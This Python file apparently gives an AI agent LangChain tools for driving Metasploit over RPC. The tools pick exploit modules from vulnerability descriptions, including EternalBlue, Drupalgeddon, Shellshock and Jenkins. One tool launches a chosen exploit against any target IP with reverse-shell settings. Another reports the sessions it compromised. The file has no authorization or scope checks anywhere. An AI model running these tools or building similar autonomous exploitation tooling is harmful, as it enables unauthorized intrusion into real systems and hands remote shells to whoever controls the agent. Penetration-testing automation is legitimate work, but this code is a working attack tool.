import os
import sys
import time
import json
from typing import Dict, Any, List, Optional
from langchain_core.tools import tool
from pymetasploit3.msfrpc import MsfRpcClient
from colorama import Fore, Style

# Global client instance (lazy initialization)
_msf_client = None


def get_msf_client() -> MsfRpcClient:
    """Get or create Metasploit RPC client with lazy initialization"""
    global _msf_client

    if _msf_client is None:
        # Get connection parameters from environment
        password = os.getenv("MSF_PASSWORD", "msf")
        server = os.getenv("MSF_SERVER", "127.0.0.1")
        port = int(os.getenv("MSF_PORT", "55553"))
        ssl = os.getenv("MSF_SSL", "true").lower() == "true"

        try:
            _msf_client = MsfRpcClient(password, server=server, port=port, ssl=ssl)
            print(f"{Fore.GREEN}[+] Connected to Metasploit RPC service{Style.RESET_ALL}")
        except Exception as e:
            raise ConnectionError(f"Failed to connect to Metasploit RPC: {str(e)}")

    return _msf_client


def validate_metasploit_connection() -> bool:
    """Validate that Metasploit RPC service is accessible"""
    try:
        client = get_msf_client()
        # Test connection by getting version
        version = client.core.version
        print(f"{Fore.GREEN}✓ Metasploit RPC connected (v{version['version']}){Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}✗ Metasploit RPC not available: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Start with: msfrpcd -P <password> -p 55553{Style.RESET_ALL}")
        return False


@tool
def search_and_select_exploit(vulnerability_info: str) -> str:
    """
    Search for and select the best exploit based on vulnerability information

    Args:
        vulnerability_info: Description of vulnerabilities found (e.g., "WordPress 5.3, Social Warfare 3.5.2 RCE", "MS17-010 EternalBlue", etc.)

    Returns:
        Selected exploit module and configuration details
    """
    try:
        client = get_msf_client()

        print(f"{Fore.CYAN}[DEBUG] Searching exploits for vulnerability: {vulnerability_info}{Style.RESET_ALL}")

        # Map common vulnerabilities to specific exploits
        vulnerability_map = {
            "ms17-010": "exploit/windows/smb/ms17_010_eternalblue",
            "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
            "social warfare": "exploit/unix/webapp/wp_social_warfare_rce",
            "social_warfare": "exploit/unix/webapp/wp_social_warfare_rce",
            "wordpress xmlrpc": "auxiliary/scanner/http/wordpress_xmlrpc_login",
            "apache struts": "exploit/multi/http/struts2_content_type_ognl",
            "drupalgeddon": "exploit/unix/webapp/drupal_drupalgeddon2",
            "heartbleed": "auxiliary/scanner/ssl/openssl_heartbleed",
            "shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
            "wordpress admin": "auxiliary/scanner/http/wordpress_login_enum",
            "tomcat": "exploit/multi/http/tomcat_mgr_deploy",
            "jenkins": "exploit/multi/http/jenkins_script_console",
        }

        vuln_lower = vulnerability_info.lower()
        selected_exploit = None

        # Check for known vulnerability mappings
        for vuln_key, exploit_path in vulnerability_map.items():
            if vuln_key in vuln_lower:
                selected_exploit = exploit_path
                print(f"{Fore.GREEN}[DEBUG] Matched known vulnerability: {vuln_key} -> {exploit_path}{Style.RESET_ALL}")
                break

        # If no direct match, search for relevant exploits
        if not selected_exploit:
            # Extract keywords for search
            search_terms = []
            if "wordpress" in vuln_lower or "wp" in vuln_lower:
                search_terms.append("wordpress")
            if "apache" in vuln_lower:
                search_terms.append("apache")
            if "windows" in vuln_lower or "smb" in vuln_lower:
                search_terms.append("smb")
            if "linux" in vuln_lower:
                search_terms.append("linux")
            if "rce" in vuln_lower or "remote code" in vuln_lower:
                search_terms.append("code")

            # Search for exploits
            all_exploits = client.modules.exploits
            matching = []

            for term in search_terms:
                matching.extend([e for e in all_exploits if term in e.lower()])

            if matching:
                # Remove duplicates and take first match
                matching = list(set(matching))[:5]
                selected_exploit = matching[0]
                print(f"{Fore.YELLOW}[DEBUG] Found potential exploit: {selected_exploit}{Style.RESET_ALL}")

        if selected_exploit:
            # Get exploit details
            try:
                module_info = client.modules.use('exploit', selected_exploit)
                result = f"Selected Exploit: {selected_exploit}\n"
                result += f"Description: {module_info.get('description', 'N/A')[:200]}...\n"
                result += f"Rank: {module_info.get('rank', 'normal')}\n"
                result += f"\nRequired options:\n"
                result += f"  RHOSTS: [target IP]\n"
                if 'reverse' in selected_exploit.lower():
                    result += f"  LHOST: [your IP for reverse connection]\n"
                    result += f"  LPORT: 4444\n"
                return result
            except:
                return f"Selected exploit: {selected_exploit}\nReady for execution with target configuration."
        else:
            return f"No specific exploit found for: {vulnerability_info}\nManual selection may be required."

    except Exception as e:
        return f"Error searching exploits: {str(e)}"


# Removed list_payloads - not needed for MVP


@tool
def execute_exploit(exploit_module: str, rhosts: str, lhost: str = None, lport: str = "4444") -> str:
    """
    Execute a Metasploit exploit module against a target (MVP version)

    Args:
        exploit_module: Full exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
        rhosts: Target host(s) IP address
        lhost: Local host for reverse connections (auto-detected if not provided)
        lport: Local port for reverse connections (default: 4444)

    Returns:
        Execution result and session information
    """
    try:
        client = get_msf_client()

        print(f"{Fore.RED}[DEBUG] EXECUTING EXPLOIT: {exploit_module}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Target: {rhosts}{Style.RESET_ALL}")

        # Create a console for execution
        console = client.consoles.create()
        console_id = console['id']

        # Use the exploit module
        cmd = f"use {exploit_module}"
        client.consoles.console(console_id).write(cmd)
        time.sleep(1)

        # Set RHOSTS
        cmd = f"set RHOSTS {rhosts}"
        client.consoles.console(console_id).write(cmd)
        time.sleep(0.5)

        # Auto-detect LHOST if not provided
        if not lhost:
            import socket
            try:
                # Get local IP address
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                lhost = s.getsockname()[0]
                s.close()
            except:
                lhost = "127.0.0.1"
            print(f"{Fore.YELLOW}[DEBUG] Auto-detected LHOST: {lhost}{Style.RESET_ALL}")

        # Set LHOST if needed (for reverse connections)
        if 'reverse' in exploit_module.lower() or 'bind' not in exploit_module.lower():
            cmd = f"set LHOST {lhost}"
            client.consoles.console(console_id).write(cmd)
            time.sleep(0.5)

            # Set LPORT
            cmd = f"set LPORT {lport}"
            client.consoles.console(console_id).write(cmd)
            time.sleep(0.5)

        # Check exploit configuration
        client.consoles.console(console_id).write("options")
        time.sleep(1)

        # Execute the exploit
        print(f"{Fore.RED}[!] Launching exploit...{Style.RESET_ALL}")
        client.consoles.console(console_id).write("exploit -j")

        # Wait for execution and collect output
        time.sleep(5)
        output = client.consoles.console(console_id).read()

        # Check for new sessions
        sessions = client.sessions.list
        session_info = ""
        if sessions:
            session_info = f"\n\n{Fore.GREEN}[+] Active sessions:{Style.RESET_ALL}\n"
            for sid, sinfo in sessions.items():
                session_info += f"  Session {sid}: {sinfo.get('type', 'unknown')} @ {sinfo.get('target_host', 'unknown')}\n"

        # Clean up console
        client.consoles.destroy(console_id)

        return f"Exploit execution result:\n{output['data']}{session_info}"

    except Exception as e:
        return f"Error executing exploit: {str(e)}"


# Removed run_auxiliary - not needed for MVP


@tool
def check_sessions() -> str:
    """
    Check for active Metasploit sessions after exploitation

    Returns:
        List of active sessions and their details
    """
    try:
        client = get_msf_client()

        print(f"{Fore.CYAN}[DEBUG] Checking for active sessions{Style.RESET_ALL}")
        sessions = client.sessions.list

        if not sessions:
            return "No active sessions - exploitation may have failed"

        result = f"{Fore.GREEN}EXPLOITATION SUCCESSFUL!{Style.RESET_ALL}\n"
        result += "Active sessions:\n\n"
        for sid, sinfo in sessions.items():
            result += f"Session {sid}:\n"
            result += f"  Type: {sinfo.get('type', 'unknown')}\n"
            result += f"  Info: {sinfo.get('info', 'unknown')}\n"
            result += f"  Target: {sinfo.get('target_host', 'unknown')}\n"
            result += f"  Exploit: {sinfo.get('via_exploit', 'unknown')}\n\n"

        return result

    except Exception as e:
        return f"Error checking sessions: {str(e)}"


# Removed generate_payload and run_post_module - not needed for MVP